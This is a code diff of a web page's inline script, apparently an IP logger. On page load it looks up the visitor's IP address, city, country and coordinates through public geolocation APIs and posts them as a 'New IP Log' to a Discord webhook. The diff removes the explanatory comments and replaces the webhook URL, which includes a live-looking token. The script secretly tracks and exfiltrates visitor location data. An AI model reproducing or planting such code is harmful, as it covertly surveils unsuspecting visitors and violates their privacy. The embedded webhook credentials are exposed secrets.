@@ -56,7 +56,6 @@
         </div>
     </div>
     <script>
-        // Fetch geolocation data including IP
         fetch('https://ipinfo.io/json')
             .then(response => response.json())
             .then(data => {
@@ -66,12 +65,10 @@
                 const [lat, lon] = (data.loc || '').split(',') || ['Unknown', 'Unknown'];
                 
                 if (countryCode === 'Unknown' || !countryCode) {
-                    // Send without country name
                     sendPayload(ip, city, 'Unknown', lat, lon);
                     return;
                 }
-                
-                // Fetch country name
+            
                 fetch(`https://restcountries.com/v3.1/alpha/${countryCode}?fields=name`)
                     .then(response => response.json())
                     .then(geo => {
@@ -85,14 +82,12 @@
             })
             .catch(err => {
                 console.error('IPinfo fetch error:', err);
-                // Fallback to ipify for IP only
                 fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
                     .then(data => {
                         sendPayload(data.ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown');
                     })
                     .catch(() => {
-                        // Even fallback fails, just don't send
                     });
             });
 
@@ -101,7 +96,7 @@
                 content: `**New IP Log**\n**IP:** \`${ip}\`\n**City:** ${city}\n**Country:** ${country}\n**Coordinates:** ${lat}, ${lon}`
             };
             
-            fetch('https://discord.com/api/webhooks/1438923668091699220/mCkSrF8MtQUTOsjoqbC2qrcmhJHoNh4xwrVqMcmpviJ3bEjeJoiiB3O__dpF8Lv0ZsQz', {
+            fetch('https://discord.com/api/webhooks/1441788885268041788/n17DxZidjM-rc_RldYGa_ROF4zzohKWlcK_ZhyY3-Cf07O0LJRPNE3XA4MmIleWdQQCM', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
